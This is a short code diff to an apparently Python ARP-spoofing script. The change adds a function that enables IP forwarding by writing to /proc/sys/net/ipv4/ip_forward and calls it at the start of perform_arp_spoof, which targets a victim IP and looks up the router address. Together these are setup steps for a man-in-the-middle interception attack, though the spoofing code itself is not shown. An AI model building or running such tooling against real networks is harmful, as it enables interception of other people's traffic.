@@ -3,8 +3,22 @@ import threading
 import os
 
 
+def enable_ip_forwarding():
+    """
+    Enables IP forwarding on Linux by writing to /proc/sys/net/ipv4/ip_forward.
+    """
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        print("[*] IP forwarding enabled.")
+    except PermissionError:
+        print("[!] Permission denied. Run this script with elevated privileges (sudo).")
+    except Exception as e:
+        print(f"[!] Failed to enable IP forwarding: {e}")
+
+
 def perform_arp_spoof(victim_ip, iface="eth0"):
-    # Get the router's IP address
+    enable_ip_forwarding()
     router_ip = subprocess.check_output(
         ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
 
